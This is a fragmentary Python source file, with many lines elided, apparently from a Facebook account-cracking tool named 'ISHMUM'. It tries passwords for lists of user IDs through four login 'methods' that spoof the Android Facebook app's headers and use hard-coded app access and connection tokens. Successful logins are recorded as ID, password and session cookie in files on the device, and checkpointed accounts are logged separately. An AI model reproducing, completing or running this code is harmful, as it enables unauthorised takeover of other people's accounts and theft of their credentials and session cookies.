...
class iAmMain:
	...
	def method1(self,uid,nm,pwx):
		try:
			...
			ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBDV/SM-M325F;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'X-FB-Server-Cluster': 'True',}
				...
				if "session_key" in q:
					...
					ok.append(uid)
					open('/sdcard/ISHMUM _OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ISHMUM _COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[ISHMUM -CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ISHMUM _M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
				...
				if "session_key" in q:
					...
					ok.append(uid)
					open('/sdcard/ISHMUM _M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ISHMUM _M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[ISHMUM -CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ISHMUM _M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
'x-fb-connection-token': connection_token()}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[ISHMUM -OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/ISHMUM _M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ISHMUM _M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[ISHMUM -CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ISHMUM _M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/ISHMUM _M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ISHMUM _M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[ISHMUM -CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ISHMUM _M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
